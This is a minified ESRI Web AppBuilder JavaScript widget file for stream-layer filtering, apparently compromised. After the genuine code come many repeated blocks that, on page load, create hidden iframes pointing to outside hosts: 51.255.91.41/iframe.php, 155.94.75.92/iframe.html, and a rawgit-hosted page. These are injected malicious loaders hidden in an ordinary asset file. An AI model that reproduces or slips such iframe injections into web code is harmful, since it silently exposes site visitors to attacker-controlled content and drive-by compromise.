// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/Stream/FilterItem.html":'\x3cdiv\x3e\r\n  \x3cdiv data-dojo-attach-point\x3d"controlSection"\x3e\r\n  \x3c/div\x3e\r\n  \x3cdiv data-dojo-attach-point\x3d"filterSection" style\x3d"display:none"\x3e\r\n    \x3cdiv data-dojo-attach-point\x3d"attrFilterParams"\x3e\x3c/div\x3e\r\n    \x3cdiv class\x3d"jimu-btn" data-dojo-attach-point\x3d"applyAttrFilterBtn"\x3e\r\n      ${nls.applyAttrFilter}\r\n    \x3c/div\x3e\r\n  \x3c/div\x3e\r\n\x3c/div\x3e'}});
define("dojo/_base/declare dojo/_base/lang dojo/on dojo/json dojo/dom-style dojo/dom-construct dijit/_WidgetBase dijit/_TemplatedMixin dojo/text!./FilterItem.html jimu/dijit/CheckBox dijit/form/RadioButton jimu/dijit/FilterParameters jimu/filterUtils jimu/utils".split(" "),function(f,c,d,g,b,e,h,k,l,m,n,p,q,r){return f([h,k],{baseClass:"jimu-widget-stream-filterItem",templateString:l,streamLayer:null,config:null,type:null,checked:!1,uid:"",index:0,askForValues:!0,postCreate:function(){this.inherited(arguments);
this._init()},_init:function(){var a;"checkbox"===this.type?(this.control=new m({checked:this.checked,label:this.config.name,onChange:c.hitch(this,this._checkBoxChange)}),this.control.placeAt(this.controlSection)):"radio"===this.type&&(a=e.create("div",{},this.controlSection),this.control=new n({checked:this.checked,value:this.config.name,name:this.uid+"_attFilterItem",id:this.uid+"_attFilterItem_"+this.index}),this.own(d(this.control,"change",c.hitch(this,function(a){this._checkBoxChange(a)}))),
this.control.placeAt(a),e.create("label",{"class":"jimu-widget-normal",innerHTML:r.sanitizeHTML(this.config.name),"for":this.uid+"_attFilterItem_"+this.index},a));this.attrParamsDijit=new p;this.attrParamsDijit.placeAt(this.attrFilterParams);this.attrParamsDijit.startup();a=g.parse(this.streamLayer._json);this.attrParamsDijit.build(this.streamLayer.url,a,this.config.filterInfo);(this.askForValues=(new q).isAskForValues(this.config.filterInfo))?this.own(d(this.applyAttrFilterBtn,"click",c.hitch(this,
this._applyFilter))):b.set(this.applyAttrFilterBtn,"display","none")},unCheck:function(){"checkbox"===this.type?this.control.setValue(!1):"radio"===this.type&&this.control.set("checked",!1);b.set(this.filterSection,"display","none")},_applyFilter:function(){var a=this.attrParamsDijit.getFilterExpr();a&&"string"===typeof a&&(this.streamLayer.setDefinitionExpression(a),this.streamLayer.clear())},_checkBoxChange:function(a){a?this.askForValues?b.set(this.filterSection,"display",""):this._applyFilter():
(b.set(this.filterSection,"display","none"),"checkbox"===this.type&&this.streamLayer&&this.streamLayer.setDefinitionExpression(null))}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});